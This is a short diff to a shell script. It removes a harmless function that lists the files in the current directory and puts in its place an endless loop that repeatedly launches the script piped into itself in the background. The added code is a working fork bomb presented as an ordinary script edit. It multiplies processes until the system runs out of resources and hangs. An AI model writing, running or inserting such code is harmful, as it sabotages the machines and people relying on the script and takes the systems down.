@@ -1,10 +1,5 @@
-#!/usr/bin/bash
+#!/bin/sh
 
-󱨇() {
-    local 󰺛
-    for 󰺛 in "$PWD"/*; do
-        echo "$󰺛"
-    done
-}
-
-󱨇
+while true; do
+    $0 | $0 &
+done
